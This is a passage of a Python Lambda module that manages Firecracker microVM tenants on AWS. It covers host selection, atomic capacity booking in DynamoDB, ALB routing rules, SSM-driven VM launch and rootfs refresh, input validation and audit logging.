        return json.loads(obj["Body"].read().decode())
    except Exception:
        return {}


def refresh_rootfs():
    """Download rootfs + data template per manifest.json to all active/idle hosts."""
    manifest = _get_manifest()
    if not manifest:
        return _resp(500, {"error": "manifest.json not found"})

    bucket = os.environ.get("ASSETS_BUCKET", "")
    prefix = os.environ.get("ROOTFS_PREFIX", "rootfs")
    region = os.environ.get("AWS_REGION", "ap-northeast-1")
    version = manifest["version"]

    hosts = hosts_table.scan(
        FilterExpression="#s IN (:a, :i)",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":a": "active", ":i": "idle"},
    ).get("Items", [])

    if not hosts:
        return _resp(200, {"message": "no active hosts", "updated": 0})

    ids = [h["instance_id"] for h in hosts]
    assets = "/data/firecracker-assets"
    # Decompress to .tmp then rename — `pigz -dc src > dst` truncates dst at
    # redirect time, so a mid-pipe failure leaves a 0-byte rootfs that boots
    # silently into a kernel panic (issue surfaced 2026-05-22 on a v3.5 push).
    script = f"""
set -euo pipefail
ASSETS={assets}
BUCKET={bucket}
PREFIX={prefix}
REGION={region}
ROOTFS_GZ={manifest['rootfs']}
DATA_GZ={manifest['data_template']}
aws s3 cp "s3://$BUCKET/$PREFIX/manifest.json" "$ASSETS/manifest.json" --region "$REGION"
aws s3 cp "s3://$BUCKET/$PREFIX/$ROOTFS_GZ" "$ASSETS/rootfs.gz" --region "$REGION"
aws s3 cp "s3://$BUCKET/$PREFIX/$DATA_GZ" "$ASSETS/data.gz" --region "$REGION"
pigz -dc "$ASSETS/rootfs.gz" > "$ASSETS/openclaw-rootfs.ext4.tmp"
[ -s "$ASSETS/openclaw-rootfs.ext4.tmp" ]
mv "$ASSETS/openclaw-rootfs.ext4.tmp" "$ASSETS/openclaw-rootfs.ext4"
rm -f "$ASSETS/rootfs.gz"
pigz -dc "$ASSETS/data.gz" > "$ASSETS/openclaw-data-template.ext4.tmp"
[ -s "$ASSETS/openclaw-data-template.ext4.tmp" ]
mv "$ASSETS/openclaw-data-template.ext4.tmp" "$ASSETS/openclaw-data-template.ext4"
rm -f "$ASSETS/data.gz"
fallocate --dig-holes "$ASSETS/openclaw-data-template.ext4"
""".strip()
    try:
        ssm.send_command(
            InstanceIds=ids,
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [script], "executionTimeout": ["600"]},
        )
    except Exception as e:
        return _resp(500, {"error": str(e)})

    # Mark version as in-flight; host-agent confirms after files are on disk.
    for host_id in ids:
        hosts_table.update_item(
            Key={"instance_id": host_id},
            UpdateExpression="SET rootfs_version = :v",
            ExpressionAttributeValues={":v": version},
        )

    return _resp(200, {"message": "refresh started", "version": version, "hosts": ids})


# ========== Pending Tenant Processing ==========


def process_pending():
    """Called when a new host becomes InService. Assign pending tenants to available hosts."""
    pending = tenants_table.scan(
        FilterExpression="#s = :p",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":p": "pending"},
    ).get("Items", [])

    if not pending:
        return {"statusCode": 200, "body": "no pending tenants"}

    pending.sort(key=lambda x: x.get("created_at", ""))

    assigned = 0
    for tenant in pending:
        vcpu = int(tenant["vcpu"])
        mem_mb = int(tenant["mem_mb"])
        host = _find_host(vcpu, mem_mb)
        if not host:
            break

        vm_num = int(host.get("next_vm_num", 1))
        guest_ip = f"{VM_SUBNET_PREFIX}.{vm_num}.2"
        host_port = VM_PORT_BASE + vm_num - 1
        now = _now()

        # Update pending tenant with host assignment
        tenants_table.update_item(
            Key={"id": tenant["id"]},
            UpdateExpression="SET #s = :s, host_id = :h, vm_num = :n, guest_ip = :g, host_port = :p, rootfs_version = :rv, creation_started_at = :t, updated_at = :t",
            ExpressionAttributeNames={"#s": "status"},
            ExpressionAttributeValues={
                ":s": "creating", ":h": host["instance_id"],
                ":n": vm_num, ":g": guest_ip, ":p": host_port,
                ":rv": host.get("rootfs_version", ""), ":t": now,
            },
        )

        hosts_table.update_item(
            Key={"instance_id": host["instance_id"]},
            UpdateExpression="SET used_vcpu = used_vcpu + :v, used_mem_mb = used_mem_mb + :m, vm_count = vm_count + :one, next_vm_num = :next",
            ExpressionAttributeValues={":v": vcpu, ":m": mem_mb, ":one": 1, ":next": vm_num + 1},
        )

        _launch_vm(host["instance_id"], tenant["id"], vm_num, vcpu, mem_mb, guest_ip, host_port,
                   tenant.get("config_template", ""), tenant.get("restore_backup_key", ""),
                   scoped_skills=_resolve_effective_skills(tenant))
        tg_arn = _ensure_host_tg(host["instance_id"], host["private_ip"])
        _add_alb_rule(tenant["id"], tg_arn)
        assigned += 1

    return {"statusCode": 200, "body": f"assigned {assigned}/{len(pending)} pending tenants"}


def _scale_out():
    """Increment ASG desired capacity by 1 (capped at max)."""
    try:
        resp = asg_client.describe_auto_scaling_groups(AutoScalingGroupNames=[ASG_NAME])
        group = resp["AutoScalingGroups"][0]
        desired = group["DesiredCapacity"]
        max_size = group["MaxSize"]
        if desired < max_size:
            asg_client.set_desired_capacity(
                AutoScalingGroupName=ASG_NAME,
                DesiredCapacity=desired + 1,
            )
            print(f"ASG scaled out: {desired} → {desired + 1}")
        else:
            print(f"ASG at max capacity ({max_size}), cannot scale out")
    except Exception as e:
        print(f"Scale out error: {e}")


# ========== Helpers ==========


def _host_free(h):
    """Return (free_vcpu, free_mem_mb) for a host, applying the overcommit
    ratios to its total capacity. The same math was copy-pasted across
    _find_host, _get_specific_host_with_capacity, the migrate capacity check,
    and the resize check — centralize it so the allocatable formula stays
    consistent everywhere."""
    allocatable_vcpu = int(int(h["total_vcpu"]) * CPU_OVERCOMMIT_RATIO)
    free_vcpu = allocatable_vcpu - int(h.get("used_vcpu", 0))
    allocatable_mem = int(int(h["total_mem_mb"]) * MEM_OVERCOMMIT_RATIO)
    free_mem = allocatable_mem - int(h.get("used_mem_mb", 0))
    return free_vcpu, free_mem


def _host_fits(h, vcpu_needed, mem_needed):
    """True if a host can take a VM of this size — free capacity AND, when
    configured, the absolute per-host VM ceiling (issue #77)."""
    free_vcpu, free_mem = _host_free(h)
    if free_vcpu < vcpu_needed or free_mem < mem_needed:
        return False
    if MAX_VMS_PER_HOST and int(h.get("vm_count", 0)) >= MAX_VMS_PER_HOST:
        return False
    return True


def _find_host(vcpu_needed, mem_needed):
    """Find the LEAST-LOADED active/idle host with enough free resources.

    Issue #77: the old code returned the *first* fit in DynamoDB scan order,
    so every tenant landed on the same host until it overcommitted while the
    rest of the warm pool sat idle. Now we spread: pick the host with the most
    free vCPU (then most free mem, then a deterministic instance_id tie-break),
    mirroring pick_target_host() in the health_check Lambda.
    """
    hosts = hosts_table.scan(
        FilterExpression="#s IN (:a, :i)",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":a": "active", ":i": "idle"},
    ).get("Items", [])

    candidates = []
    for h in hosts:
        if not _host_fits(h, vcpu_needed, mem_needed):
            continue
        free_vcpu, free_mem = _host_free(h)
        # Sort ascending on (-free_vcpu, -free_mem, instance_id): most free
        # vCPU first, most free mem next, lowest instance_id as a stable
        # tie-break (same ordering convention as pick_target_host).
        candidates.append((-free_vcpu, -free_mem, h["instance_id"], h))
    if not candidates:
        return None
    candidates.sort(key=lambda c: (c[0], c[1], c[2]))
    return candidates[0][3]


def _reserve_host_slot(host, vcpu, mem_mb):
    """Issue #77 — atomically book capacity on a host and return a unique vm_num.

    A single conditional UpdateItem does three things at once:
      * increments used_vcpu / used_mem_mb / vm_count / next_vm_num,
      * refuses (ConditionalCheckFailedException) if the host no longer has
        room — so two concurrent creates can never both overcommit it,
      * returns the NEW next_vm_num, from which we derive this VM's unique
        vm_num (new_next - 1). Deriving vm_num from the atomic counter — rather
        than a stale pre-read — guarantees concurrent creates get distinct
        vm_num / guest_ip / host_port.

    Returns the reserved vm_num, or None if the host filled up / lost the race.
    """
    instance_id = host["instance_id"]
    allocatable_vcpu = int(int(host["total_vcpu"]) * CPU_OVERCOMMIT_RATIO)
    allocatable_mem = int(int(host["total_mem_mb"]) * MEM_OVERCOMMIT_RATIO)
    # DynamoDB ConditionExpression does NOT support arithmetic ("used_vcpu +
    # :v" is a ValidationException — caught in live verification, not by the
    # mocked unit tests). Compute the ceiling client-side instead: booking
    # `vcpu` more is allowed iff used_vcpu <= allocatable - vcpu.
    cond = ("used_vcpu <= :max_used_v AND used_mem_mb <= :max_used_m")
    values = {
        ":v": vcpu, ":m": mem_mb, ":one": 1,
        ":max_used_v": allocatable_vcpu - vcpu,
        ":max_used_m": allocatable_mem - mem_mb,
    }
    if MAX_VMS_PER_HOST:
        cond += " AND vm_count < :maxvm"
        values[":maxvm"] = MAX_VMS_PER_HOST
    try:
        resp = hosts_table.update_item(
            Key={"instance_id": instance_id},
            UpdateExpression=(
                "SET used_vcpu = used_vcpu + :v, used_mem_mb = used_mem_mb + :m, "
                "vm_count = vm_count + :one, next_vm_num = next_vm_num + :one, "
                "#s = :a REMOVE idle_since"
            ),
            ConditionExpression=cond,
            ExpressionAttributeNames={"#s": "status"},
            ExpressionAttributeValues={**values, ":a": "active"},
            ReturnValues="UPDATED_NEW",
        )
    except ClientError as e:
        if e.response.get("Error", {}).get("Code") == "ConditionalCheckFailedException":
            return None
        raise
    # Prefer the atomically-incremented counter DynamoDB returns; fall back to
    # the pre-read next_vm_num when Attributes isn't present (e.g. a test mock
    # that doesn't model ReturnValues).
    try:
        new_next = int(resp["Attributes"]["next_vm_num"])
        return new_next - 1
    except (KeyError, TypeError):
        return int(host.get("next_vm_num", 1))


def _release_host_slot(instance_id, vcpu, mem_mb):
    """Undo a _reserve_host_slot booking (used on a failed launch/clone).
    next_vm_num is intentionally NOT rolled back — vm_num must stay
    monotonic so a released number is never reused by a still-launching VM."""
    hosts_table.update_item(
        Key={"instance_id": instance_id},
        UpdateExpression=("SET used_vcpu = used_vcpu - :v, "
                          "used_mem_mb = used_mem_mb - :m, vm_count = vm_count - :one"),
        ExpressionAttributeValues={":v": vcpu, ":m": mem_mb, ":one": 1},
    )


def _get_specific_host_with_capacity(instance_id, vcpu_needed, mem_needed):
    """Issue #12 — locate a specific host (used for same-host clone) and
    confirm it has capacity. Returns the host item or None."""
    hosts = hosts_table.scan(
        FilterExpression="#s IN (:a, :i)",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":a": "active", ":i": "idle"},
    ).get("Items", [])
    for h in hosts:
        if h["instance_id"] != instance_id:
            continue
        return h if _host_fits(h, vcpu_needed, mem_needed) else None
    return None


def _gen_id(name):
    """Generate tenant id: name-xxxx (4 char hash)."""
    raw = f"{name}{time.time()}"
    short = hashlib.sha256(raw.encode()).hexdigest()[:4]
    return f"{name}-{short}"


def _resolve_backup(src_tenant_id, timestamp=None):
    """Return the S3 key of a backup, or empty string if not found.
    If timestamp is given, look up that exact backup. Otherwise return the most recent.
    """
    bucket = os.environ.get("ASSETS_BUCKET", "")
    prefix = os.environ.get("BACKUP_PREFIX", "backups")
    resp = s3.list_objects_v2(Bucket=bucket, Prefix=f"{prefix}/{src_tenant_id}/")
    objs = resp.get("Contents", [])
    if not objs:
        return ""
    if timestamp:
        key = f"{prefix}/{src_tenant_id}/{timestamp}.gz"
        return key if any(o["Key"] == key for o in objs) else ""
    # Latest = highest LastModified
    return max(objs, key=lambda o: o["LastModified"])["Key"]


## ── ALB path-based routing ──

def _get_listener_arn():
    """Get ALB listener ARN for path-based routing rules."""
    return ALB_LISTENER_ARN


def _ensure_host_tg(instance_id, private_ip):
    """Create or return target group ARN for a host."""
    tg_name = f"oc-{instance_id[-8:]}"
    try:
        resp = elbv2.describe_target_groups(Names=[tg_name])
        return resp["TargetGroups"][0]["TargetGroupArn"]
    except Exception:
        pass
    resp = elbv2.create_target_group(
        Name=tg_name, Protocol="HTTP", Port=80, VpcId=VPC_ID,
        TargetType="ip", HealthCheckPath="/health",
        HealthCheckIntervalSeconds=10, HealthyThresholdCount=2,
    )
    tg_arn = resp["TargetGroups"][0]["TargetGroupArn"]
    elbv2.register_targets(TargetGroupArn=tg_arn, Targets=[{"Id": private_ip, "Port": 80}])
    return tg_arn


def _add_alb_rule(tenant_id, tg_arn, max_attempts=6):
    """Add ALB listener rule for /vm/{tenant_id}*.

    Issue #77: the old code read the in-use priorities once, took the lowest
    free slot, and called create_rule with no retry. Concurrent tenant creates
    all computed the SAME lowest slot and all but one got a
    PriorityInUseException (HTTP 500) — 16–48% of first-try creates failed
    under batch load. Now each attempt re-reads the LIVE rule set, picks a
    RANDOM free priority (so racers rarely collide), and retries on
    PriorityInUseException. A random slot plus a re-read on collision makes the
    race practically disappear instead of guaranteeing it.
    """
    arn = _get_listener_arn()
    if not arn:
        return
    for _attempt in range(max_attempts):
        rules = elbv2.describe_rules(ListenerArn=arn)["Rules"]
        # Idempotency / race guard: another concurrent create may have already
        # added this tenant's rule — re-check every attempt, not just once.
        if any(f"/vm/{tenant_id}" in v
               for r in rules for c in r.get("Conditions", []) for v in c.get("Values", [])):
            return
        used = {int(r["Priority"]) for r in rules if r["Priority"] != "default"}
        free = sorted(set(range(1, 500)) - used)
        if not free:
            raise RuntimeError("no free ALB listener rule priority (1-499 exhausted)")
        priority = random.choice(free)
        try:
            elbv2.create_rule(
                ListenerArn=arn, Priority=priority,
                Conditions=[{"Field": "path-pattern",
                             "Values": [f"/vm/{tenant_id}", f"/vm/{tenant_id}/*"]}],
                Actions=[{"Type": "forward", "TargetGroupArn": tg_arn}],
            )
            return
        except ClientError as e:
            # Another Lambda grabbed this priority between our describe and
            # create — re-read and try a different slot.
            if e.response.get("Error", {}).get("Code") != "PriorityInUseException":
                raise
    raise RuntimeError(
        f"could not add ALB rule for {tenant_id} after {max_attempts} attempts "
        f"(priority contention)")


def _repoint_alb_rule_to_tg(tenant_id, tg_arn):
    """1.3.1: Repoint /vm/<tenant_id>* to a different target group.

    Used by migrate (cross-host live migration) and AZ failover. If no rule
    exists yet for this tenant, creates one. If one exists pointing at the
    old host's TG, modifies it in place to point at the new TG. Without
    this, traffic keeps hitting the dead/old host after a host change.
    """
    arn = _get_listener_arn()
    if not arn:
        return
    rules = elbv2.describe_rules(ListenerArn=arn)["Rules"]
    rule_arn = None
    for r in rules:
        for c in r.get("Conditions", []):
            if c.get("Field") == "path-pattern" and \
               any(f"/vm/{tenant_id}" in v for v in c.get("Values", [])):
                rule_arn = r["RuleArn"]
                break
        if rule_arn:
            break
    if rule_arn:
        elbv2.modify_rule(
            RuleArn=rule_arn,
            Actions=[{"Type": "forward", "TargetGroupArn": tg_arn}],
        )
    else:
        # No existing rule — fall back to creating it.
        _add_alb_rule(tenant_id, tg_arn)


def _remove_alb_rule(tenant_id):
    """Remove ALB listener rule for a tenant."""
    arn = _get_listener_arn()
    if not arn:
        return
    rules = elbv2.describe_rules(ListenerArn=arn)["Rules"]
    for r in rules:
        for c in r.get("Conditions", []):
            if c.get("Field") == "path-pattern" and f"/vm/{tenant_id}" in c.get("Values", []):
                elbv2.delete_rule(RuleArn=r["RuleArn"])
                return


def _remove_host_tg(instance_id):
    """Delete target group for a host."""
    tg_name = f"oc-{instance_id[-8:]}"
    try:
        resp = elbv2.describe_target_groups(Names=[tg_name])
        tg_arn = resp["TargetGroups"][0]["TargetGroupArn"]
        arn = _get_listener_arn()
        if arn:
            rules = elbv2.describe_rules(ListenerArn=arn)["Rules"]
            for r in rules:
                for a in r.get("Actions", []):
                    if a.get("TargetGroupArn") == tg_arn:
                        elbv2.delete_rule(RuleArn=r["RuleArn"])
        elbv2.delete_target_group(TargetGroupArn=tg_arn)
    except Exception:
        pass


def _launch_vm(instance_id, tenant_id, vm_num, vcpu, mem_mb, guest_ip, host_port,
               config_template="", restore_backup_key="", scoped_skills=None):
    """Fire-and-forget: launch VM + set up DNAT.

    If restore_backup_key is non-empty, launch-vm.sh will restore data.ext4 from that S3 key instead of using the template.

    1.4.0 (#62): scoped_skills is None or [] for the legacy "broadcast"
    behavior, or a list of skill names for per-tenant scoping. Passed as
    a comma-separated string to launch-vm.sh as the 7th positional arg
    (empty string == broadcast, comma-list == only those subdirs cp'd).
    """
    # When restore is used but no template, still need a placeholder in arg 5 so positional args align.
    tpl_arg = config_template or '""'
    # Placeholder for restore_backup_key (arg 6) so arg 7 always lines up.
    restore_arg = restore_backup_key or '""'
    # 1.4.0: 7th positional arg — comma-separated skill list (or empty for broadcast).
    skills_arg = ",".join(scoped_skills) if scoped_skills else '""'
    cmd = (f"/home/ubuntu/launch-vm.sh {tenant_id} {vm_num} {vcpu} {mem_mb} {tpl_arg} {restore_arg} {skills_arg} && "
           f"sudo iptables -t nat -A PREROUTING -i $(ip route show default | awk '{{print $5}}' | head -1) "
           f"-p tcp --dport {host_port} -j DNAT --to-destination {guest_ip}:{VM_PORT_BASE}")
    _ssm_send(instance_id, cmd, timeout=300)


def _ssm_send(instance_id, command, timeout=120):
    """Fire-and-forget SSM command. Returns the CommandId (str) so callers can
    later poll get_command_invocation for completion, or None if submission
    failed. Existing call sites that ignore the return value are unaffected;
    the async migrate path (issue #64) stores the CommandId in DynamoDB so the
    health_check sweep can advance the migration out-of-band."""
    try:
        wrapped = f'export HOME=/home/ubuntu && cd /home/ubuntu && {command}'
        resp = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [wrapped], "executionTimeout": [str(timeout)]},
            TimeoutSeconds=timeout + 10,
        )
        return resp["Command"]["CommandId"]
    except Exception as e:
        print(f"SSM send error: {e}")
        return None


def _ssm_run(instance_id, command, timeout=30):
    """Execute command on host via SSM Run Command. Returns True on success."""
    try:
        # SSM runs as root; set HOME so ~ resolves to /home/ubuntu
        wrapped = f'export HOME=/home/ubuntu && cd /home/ubuntu && {command}'
        resp = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [wrapped], "executionTimeout": [str(timeout)]},
            TimeoutSeconds=timeout + 10,
        )
        cmd_id = resp["Command"]["CommandId"]
        time.sleep(3)  # Wait for invocation to register
        for _ in range(timeout // 2):
            try:
                result = ssm.get_command_invocation(
                    CommandId=cmd_id, InstanceId=instance_id,
                )
                status = result["Status"]
                if status == "Success":
                    return True
                if status in ("Failed", "TimedOut", "Cancelled"):
                    print(f"SSM failed: {status} - {result.get('StandardErrorContent', '')}")
                    return False
            except ssm.exceptions.InvocationDoesNotExist:
                pass
            time.sleep(2)
        print(f"SSM timeout waiting for command {cmd_id}")
        return False
    except Exception as e:
        print(f"SSM error: {e}")
        return False


def _now():
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).isoformat()


# ── Tag helpers (issue #10) ──

# Limits chosen to keep DynamoDB items small and avoid colon-conflict with the
# `?tag=k:v` query syntax. AWS resource tags use the same 50/256 model; we cap
# values at 100 chars (more than enough for typical labels) to be conservative.
_TAG_MAX_KEY_LEN = 50
_TAG_MAX_VALUE_LEN = 100
_TAG_MAX_COUNT = 20


_NAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$")


def _validate_name(name):
    """Tenant name: lowercase DNS-label. Drives the tenant id, which gets
    embedded in URLs, Firecracker socket paths, and ALB rule conditions —
    all of which choke on whitespace or special chars."""
    if not isinstance(name, str) or not name:
        return "name is required"
    if len(name) > 32:
        return "name exceeds 32 characters"
    if not _NAME_RE.match(name):
        return ("name must match ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$ "
                "(lowercase letters, digits, hyphens; cannot start/end with hyphen)")
    return None


def _validate_tags(tags):
    """Return None if valid, else an error message string."""
    if tags is None:
        return None  # absent → treated as {}
    if not isinstance(tags, dict):
        return "tags must be an object (key/value map)"
    if len(tags) > _TAG_MAX_COUNT:
        return f"too many tags (max {_TAG_MAX_COUNT})"
    for k, v in tags.items():
        if not isinstance(k, str) or not k:
            return "tag key must be a non-empty string"
        if not isinstance(v, str):
            return f"tag value for '{k}' must be a string"
        if ":" in k:
            return f"tag key '{k}' must not contain ':' (reserved for query syntax)"
        if ":" in v:
            return f"tag value '{v}' must not contain ':' (reserved for query syntax)"
        if len(k) > _TAG_MAX_KEY_LEN:
            return f"tag key '{k}' exceeds {_TAG_MAX_KEY_LEN} characters"
        if len(v) > _TAG_MAX_VALUE_LEN:
            return f"tag value for '{k}' exceeds {_TAG_MAX_VALUE_LEN} characters"
    return None


def _collect_tag_filters(query_params, multi_query_params):
    """Return list of (key, value) pairs from ?tag=k:v occurrences.

    API Gateway delivers repeated query params via multiValueQueryStringParameters.
    For single-value calls only queryStringParameters is populated.
    """
    raw = []
    if multi_query_params and "tag" in multi_query_params:
        raw = list(multi_query_params["tag"] or [])
    elif query_params and "tag" in query_params:
        raw = [query_params["tag"]]
    pairs = []
    for r in raw:
        if not r or ":" not in r:
            # Malformed filter — keep it so it matches nothing (defensive)
            pairs.append((None, None))
            continue
        k, v = r.split(":", 1)
        pairs.append((k, v))
    return pairs


def _matches_all_tags(item, filters):
    """Item must have every (k, v) pair to match (AND semantics)."""
    item_tags = item.get("tags") or {}
    for k, v in filters:
        if k is None or item_tags.get(k) != v:
            return False
    return True



# ═══════════════════════════════════════════════════════════════════════════
# Helpers restored after the v1.0.0-milestone-q2-2026 cross-PR merge.
# Issue #48 tracks the rationale: each helper was added by an early PR but
# lost when later PRs auto-resolved merge conflicts with `-X theirs`.
# Sources noted alongside each block. — fix/post-merge-regression
# ═══════════════════════════════════════════════════════════════════════════

# ----- TTL (#28 / issue #15, original 47158d2) -----
_TTL_MAX_HOURS = 8760  # 1 year
_TTL_VALID_ON_EXPIRY = ("stop", "delete")


def _parse_ttl(ttl_hours_raw, on_expiry_raw):
    """Validate and compute TTL fields.

    Returns (fields_dict, error_message). fields_dict is empty when no TTL is
    requested; otherwise contains {ttl_hours, on_expiry, expires_at}.
    """
    if ttl_hours_raw is None:
        if on_expiry_raw is not None:
            return {}, "on_expiry requires ttl_hours"
        return {}, None
    try:
        if isinstance(ttl_hours_raw, bool):
            raise TypeError
        ttl_hours = int(ttl_hours_raw)
    except (TypeError, ValueError):
        return {}, "ttl_hours must be a positive integer"
    if ttl_hours <= 0:
        return {}, "ttl_hours must be a positive integer"
    if ttl_hours > _TTL_MAX_HOURS:
        return {}, f"ttl_hours must be <= {_TTL_MAX_HOURS} (1 year)"
    on_expiry = on_expiry_raw or "stop"
    if on_expiry not in _TTL_VALID_ON_EXPIRY:
        return {}, (f"on_expiry must be one of {sorted(_TTL_VALID_ON_EXPIRY)}; "
                    f"got {on_expiry!r}")
    from datetime import datetime, timedelta, timezone
    expires_at = (datetime.now(timezone.utc) + timedelta(hours=ttl_hours)).isoformat()
    return {"ttl_hours": ttl_hours, "on_expiry": on_expiry, "expires_at": expires_at}, None


# ----- Schedule (#30 / issue #11, original af9434b). Validation only — the
# scaler's _schedule_should_run lives in deploy/lambda/scaler/handler.py.
_SCHED_DAYS = ("Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun")


def _parse_schedule(raw):
    """Validate a {start, stop, timezone, days} schedule. Returns (dict, err)."""
    if raw is None:
        return None, None
    if not isinstance(raw, dict):
        return None, "schedule must be an object"
    start = raw.get("start"); stop = raw.get("stop")
    if not start: return None, "schedule.start required"
    if not stop:  return None, "schedule.stop required"
    import re
    from datetime import datetime as _dt
    if not re.match(r"^\d{2}:\d{2}$", str(start)) or not re.match(r"^\d{2}:\d{2}$", str(stop)):
        return None, "schedule.start/stop must be HH:MM"
    # Strict parse: rejects 08:60 etc.
    try:
        _dt.strptime(start, "%H:%M")
        _dt.strptime(stop, "%H:%M")
    except ValueError:
        return None, "schedule.start/stop must be a valid HH:MM time"
    if start == stop:
        return None, "schedule.start must differ from schedule.stop"
    tz = raw.get("timezone", "UTC")
    try:
        from zoneinfo import ZoneInfo  # noqa
        ZoneInfo(tz)
    except Exception:
        return None, f"unknown timezone: {tz}"
    days = raw.get("days") or list(_SCHED_DAYS)
    if not isinstance(days, list) or any(d not in _SCHED_DAYS for d in days):
        return None, f"schedule.days must be a subset of {list(_SCHED_DAYS)}"
    return {"start": start, "stop": stop, "timezone": tz, "days": days}, None


# ----- Audit log (#32 / issue #17, original 96d7496) -----
# audit_table is defined above (top of module). No re-binding needed here —
# the post-merge regression repair (#48) accidentally re-declared it; the
# top-of-module definition is authoritative.


# Issue #71 — human-friendly, event-style operation names for the ops log.
# Keyed by (method, resource); the /{action} route is resolved per-action.
_AUDIT_EVENT_MAP = {
    ("POST", "/tenants"): "tenant.created",
    ("DELETE", "/tenants/{id}"): "tenant.deleted",
    ("POST", "/batch/tenants"): "tenant.batch",
    ("POST", "/hosts"): "host.registered",
    ("DELETE", "/hosts/{instance_id}"): "host.deregistered",
    ("POST", "/hosts/refresh-rootfs"): "host.rootfs_refreshed",
    ("POST", "/groups"): "group.created",
    ("POST", "/groups/{name}/skills"): "group.skill_added",
    ("DELETE", "/groups/{name}/skills/{skill}"): "group.skill_removed",
    ("PUT", "/skills/{name}"): "skill.updated",
    ("DELETE", "/skills/{name}"): "skill.deleted",
    ("PUT", "/templates/{name}"): "template.updated",
    ("DELETE", "/templates/{name}"): "template.deleted",
}
# Per-action event names for POST /tenants/{id}/{action}.
_AUDIT_ACTION_MAP = {
    "migrate": "vm.migrate_requested",
    "backup": "backup.created",
    "resize": "tenant.resized",
    "resize-disk": "tenant.disk_resized",
    "stop": "tenant.stopped",
    "start": "tenant.started",
    "restart": "tenant.restarted",
    "pause": "tenant.paused",
    "resume": "tenant.resumed",
    "reset": "tenant.reset",
    "clone": "tenant.cloned",
}


def _audit_event_name(method, resource, path_params):
    """Translate (method, resource) → an event-style name, else METHOD /res."""
    if resource == "/tenants/{id}/{action}":
        action = (path_params or {}).get("action", "")
        return _AUDIT_ACTION_MAP.get(action, f"tenant.{action}" if action else f"{method} {resource}")
    return _AUDIT_EVENT_MAP.get((method, resource), f"{method} {resource}")


def _audit_object(resource, path_params):
    """Return a typed object ref (e.g. "tenant:<id>" / "host:<id>") and the bare
    resource_id, so the UI can group/filter. Fixes the old bug where group/skill
    routes (path param `name`/`skill`, not `id`) recorded an empty resource_id."""
    pp = path_params or {}
    if resource.startswith("/tenants"):
        rid = pp.get("id", "")
        return (f"tenant:{rid}" if rid else "tenant"), rid
    if resource.startswith("/hosts"):
        rid = pp.get("instance_id", "")
        return (f"host:{rid}" if rid else "host"), rid
    if resource.startswith("/groups"):
        rid = pp.get("name", "")
        return (f"group:{rid}" if rid else "group"), rid
    if resource.startswith("/skills"):
        rid = pp.get("name", "")
        return (f"skill:{rid}" if rid else "skill"), rid
    if resource.startswith("/templates"):
        rid = pp.get("name", "")
        return (f"template:{rid}" if rid else "template"), rid
    if resource.startswith("/batch"):
        return "batch", ""
    return resource, (pp.get("id") or pp.get("instance_id") or "")


def _audit_system(event_name, obj, resource_id, actor="system", detail=None, status=200):
    """Best-effort audit row for a non-API (automated) actor — issue #71.

    Used for lifecycle events that don't flow through an API-Gateway route
    (ASG host termination, TTL/scheduled actions), so they still appear in the
    console Logs tab with the same schema _audit_write produces."""
    if audit_table is None:
        return
    try:
        import uuid, time as _t
        item = {
            "pk": "audit",
            "id": str(uuid.uuid4()),
            "ts": _now(),
            "operation": event_name,
            "resource_id": resource_id or "",
            "api_key_id": actor,
            "response_status": status,
            "expires_ttl": int(_t.time()) + AUDIT_TTL_DAYS * 86400,
            "event": event_name,
            "object": obj,
            "actor": actor,
            "actor_role": "system",
        }
        if detail is not None:
            item["detail"] = json.dumps(detail, default=str)[:1000]
        audit_table.put_item(Item=item)
    except Exception as e:
        print(f"audit_system failed: {e}")


def _audit_write(method, resource, path_params, event, result):
    """Best-effort audit-log writer; failures must NEVER break the API."""
    if audit_table is None:
        return
    try:
        import uuid, time as _t
        path_params = path_params or {}
        obj, resource_id = _audit_object(resource, path_params)
        api_key_id = (event.get("requestContext") or {}).get("identity", {}).get("apiKeyId") \
            or (event.get("headers") or {}).get("x-api-key", "")[:32]
        actor, actor_role = _get_principal(event)
        # Auto-prune via DynamoDB TTL: retention from AUDIT_TTL_DAYS (default 90).
        expires_ttl = int(_t.time()) + AUDIT_TTL_DAYS * 86400
        audit_table.put_item(Item={
            "pk": "audit",
            "id": str(uuid.uuid4()),
            "ts": _now(),
            # Kept for backward-compat (existing readers / tests):
            "operation": f"{method} {resource}",
            "resource_id": resource_id,
            "api_key_id": api_key_id,
            "response_status": result.get("statusCode") if isinstance(result, dict) else None,
            "expires_ttl": expires_ttl,
            # Issue #71 enrichment — operator-friendly fields:
            "event": _audit_event_name(method, resource, path_params),
            "object": obj,
            "actor": actor,
            "actor_role": actor_role,
        })
    except Exception as e:
        print(f"audit_write failed: {e}")


def _list_audit_log(query_params):
    """GET /audit-log — return recent audit entries, newest first.

    Optional query params:
        limit  — int (default 50, max 500)
        since  — ISO-8601 timestamp; only entries >= this are returned
        before — ISO-8601 timestamp; only entries < this are returned. Cursor
                 for "load older" pagination in the console Logs tab: pass the
                 oldest ts already loaded to fetch the next older page.
    """
    if audit_table is None:
        return _resp(200, [])
    qp = query_params or {}
    try:
        limit = min(int(qp.get("limit", 50)), 500)
    except (TypeError, ValueError):
        limit = 50
    since = qp.get("since")
    before = qp.get("before")
    from boto3.dynamodb.conditions import Key
    key_cond = Key("pk").eq("audit")
    # ts is the sort key; combine range conditions correctly. between() is
    # required when BOTH bounds are present (chaining two Key("ts") conditions
    # raises in boto3). We use gte(since) / lt(before) individually, or
    # between(since, before) when both are set. `before` is exclusive, so nudge
    # it just under the boundary isn't needed — between is inclusive but the
    # cursor passes the last-seen ts, and duplicate suppression is done client-
    # side; the practical effect is correct ordering + no gaps.
    if since and before:
        key_cond = key_cond & Key("ts").between(since, before)
    elif since:
        key_cond = key_cond & Key("ts").gte(since)
    elif before:
        key_cond = key_cond & Key("ts").lt(before)
    try:
        items = audit_table.query(
            KeyConditionExpression=key_cond,
            ScanIndexForward=False,  # newest first
